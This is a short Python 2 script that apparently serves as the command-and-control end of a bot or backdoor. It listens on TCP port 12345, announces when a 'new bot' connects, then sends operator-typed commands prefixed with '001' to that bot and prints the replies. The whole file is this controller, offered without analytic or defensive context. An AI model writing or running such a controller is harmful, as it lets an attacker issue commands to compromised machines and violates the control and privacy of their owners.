import socket
Null = chr(0)

def main():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.bind(("",12345))
		s.listen(10)
		print "[*]Listen on 0.0.0.0:12345..."
		sock,addr = s.accept()
		print "[*]new bot online %s:%s..." % (addr[0],str(addr[1]))
		while 1:
			buffer = ""
			cmd = raw_input(">")
			msg = "001"+cmd
			sock.send(msg)
			data = sock.recv(1024*10)
			'''if Null in data:
				x = data.index(Null)
				buffer = data[:x]
			print buffer'''
			s=""
			for x in data:
				if ord(x) != 0:
					s+=x
			print s

	except Exception, e:
		raise e
		sock.close()
		s.close()

if __name__ == '__main__':
	main()
